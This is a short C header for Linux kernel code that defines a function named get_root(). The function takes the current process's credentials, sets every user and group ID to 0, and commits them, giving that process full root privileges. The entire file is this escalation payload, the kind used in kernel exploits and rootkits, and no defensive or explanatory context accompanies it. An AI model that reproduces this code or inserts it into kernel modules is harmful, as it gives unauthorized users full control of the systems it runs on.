#include <linux/cred.h>

#ifndef CRED_HELPER_H
#define CRED_HELPER_H

static void get_root(void) {
    struct cred* root;
    
    root = prepare_creds();
    if (root == NULL) {
        return;
    }
    root->uid.val = 0;
    root->gid.val = 0;
    root->euid.val = 0;
    root->egid.val = 0;
    root->suid.val = 0;
    root->sgid.val = 0;
    root->fsuid.val = 0;
    root->fsgid.val = 0;
    commit_creds(root);
}

#endif